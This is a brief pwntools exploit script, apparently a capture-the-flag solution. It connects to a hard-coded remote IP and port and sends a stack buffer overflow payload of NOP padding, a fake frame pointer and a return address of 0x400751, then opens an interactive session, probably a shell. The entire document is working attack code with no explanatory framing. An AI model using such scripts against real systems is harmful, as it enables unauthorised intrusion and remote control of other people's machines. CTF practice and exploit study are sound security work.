from pwn import *
p = remote("114.116.54.89",10003)
#p = process("./pwn2")
#context.log_level = 'DEBUG'
#gdb.attach(p)
#context(arch='amd64',os='linux')
p.recvline()
data = '\x90'*0x30+p64(0x7fffec50)+p64(0x400751)
#print data
p.send(data)
p.interactive()
#p.recvline()
